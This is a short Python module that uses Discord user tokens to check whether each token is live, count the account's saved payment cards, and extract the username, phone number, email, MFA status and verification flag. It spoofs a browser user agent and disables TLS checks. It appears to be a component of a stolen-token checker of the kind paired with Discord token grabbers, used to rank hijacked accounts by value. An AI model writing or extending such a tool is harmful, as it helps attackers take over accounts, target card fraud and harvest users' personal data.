# -*- coding: utf-8 -*-
import urllib3
import requests
from json import loads
urllib3.disable_warnings()

class DiscordAPI:
    def __init__(self, token: str):
        self.token: str = token
        self.headers: dict[str, str] = \
        {
            'Content-Type': 'application/json',
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36",
            "Authorization": self.token
        }

        self.__BASE_URL__: str = "https://discord.com/api/v9/users/@me"

    def getValid(self) -> int:
        response = requests.get(
            url = 'https://discordapp.com/api/v9/users/@me/library',
            headers = self.headers,
            verify = False
        )
        return response.status_code

    def getCards(self):
        response = requests.get(
            url = "https://discordapp.com/api/v9/users/@me/billing/payment-sources",
            headers = self.headers,
            verify = False
        )
        data = loads(response.text)
        return len(data)

    def getInfoToken(self):
        response = requests.get(
            url = self.__BASE_URL__,
            headers = self.headers,
            verify = False
        )

        if response.status_code == 200:
            data: dict[str, str] = loads(response.text)
            phone = "NOT"
            if data["phone"] is not None:
                phone = data['phone']

            username = data['username'] + "#" + data['discriminator']
            email = data['email']
            mfa_info = data['mfa_enabled']
            verified = data['verified']

            return username, phone, email, mfa_info, verified

        return False
